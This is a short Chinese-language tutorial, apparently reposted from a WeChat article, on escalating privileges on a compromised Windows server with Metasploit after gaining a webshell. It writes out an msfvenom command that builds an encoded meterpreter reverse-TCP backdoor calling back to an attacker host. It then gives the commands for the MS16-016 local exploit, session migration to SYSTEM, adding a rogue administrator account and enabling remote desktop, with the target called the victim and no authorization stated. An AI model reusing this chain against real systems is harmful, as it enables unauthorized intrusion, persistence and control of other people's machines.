# 用MSF进行提权

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzkxNjIxNDQyMQ==&mid=2247487186&idx=1&sn=da908c7a734589a4aa28806c1ec16553&chksm=c1520928f625803eff25fa4ee058497ec8e7fbc447afe4fdf0d1c375fb6e382dd275135b1fea&scene=126&sessionid=1681667186#rd](http://mp.weixin.qq.com/s?__biz=MzkxNjIxNDQyMQ==&mid=2247487186&idx=1&sn=da908c7a734589a4aa28806c1ec16553&chksm=c1520928f625803eff25fa4ee058497ec8e7fbc447afe4fdf0d1c375fb6e382dd275135b1fea&scene=126&sessionid=1681667186#rd)

在WEB渗透中当我们拿到webshell了，我们可以试试用MSF(metasploit)来进行提权，在MSF里meterpreter很强大的！

我们先用msfvenom生成一个EXE的木马后门。

**msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 5 -b '\\x00' LHOST=192.168.1.7 LPORT=4444 -f exe > abc.exe**

![](../Images/58fbc7ce919ad3d7c58c45111bd653f0.png)

然后在到MSF根据刚才配置的木马后门进行监听...

然后在把木马上传到服务器（受害者）的机器里，必须上传到可读可写的目录下哦，

![](../Images/e96194c06151aaa4f9e148508e71dc3e.png)

  

比如这里我吧abc.exe上传到了C:\\users\\leak\\desktop\\目录下，abc.exe就是我刚才生成的后门。  

![](../Images/33f48e5490116d5ef722ef31568b4015.png)

  

然后在执行我们的后门，可以看见MSF弹回了一个session 1(会话连接)。说明我们后门程序成功执行起来了，当然你也可以在webshell执行的，但必须的有一点执行的权限哦。  

![](../Images/c5f68a7c3e54f215fc6de2207439e7ad.png)

  

getuid //可以看见我们的权限很低的，一般都是user权限的，但也遇到过某些服务器执行后就直接是system最高权限。像这种我们就直接加用户啦。这里我们是user权限，我们要把它提升到system权限。Windows最高权限。  

![](../Images/78678e892b04dc947eb156915282845a.png)

  

接着我们输入命令background     //把你当前的metasploit shell转为后台执行。search ms16  // 搜索关键字相关的漏洞.....然后我选择了MS16-016这个漏洞在进行提权use exploit/windows/local/ms16\_016\_webdav //  选择漏洞  

![](../Images/e4c4f31909115cbb2b3809bb40b5a9e9.png)

  

show options  //查看漏洞里边要设置的参数可以看见只有一个SESSION参数要设置   

![](../Images/bf3495599f053d7bb0966e6d56d4d876.png)

  

set  SESSION 1 // 设置会刚才我们后门连接的ID号 1exploit //执行提权...可以看见成功的吧漏洞利用到了PID为692的进程中...虽然提权成功了 但你getuid下还是看见的是user权限  

![](../Images/02493ea9b02dd4dc09e3cd1e10e45d43.png)

  

ps一下查看进程根据刚才的提示找到PID 692的进程可以看见确实是system权限  

![](../Images/0fe82c7ec1df502f02459db232bde001.png)

  

所以我们还要用到migrate 命令 //迁移到一个指定的进程ID。migrate 692  //在getuid下可以看见为system权限啦提权成功了  

![](../Images/dcef2cfdcba7c1b89ca662efa6816610.png)

  

既然有了system权限 那我们在添加账号hack添加为管理员组  

![](../Images/4c2e125900fed183ea4018416f9f7354.png)

  

用Nmap扫下并没有开启远程登陆3389

  

![](../Images/02b71e87343fe0a5c51a9b70a208af28.png)

  

run getgui -e  //开启目标主机3389  貌似这条MSF命令只对2003的系统有效 执行几次都没成功 所以就用cmd命令开了3389端口  

![](../Images/5f91ad361b5711c21fcf59fa22bbc1aa.png)

  
提权成功，登录服务器。。。。简单的做个笔记，记性不好。
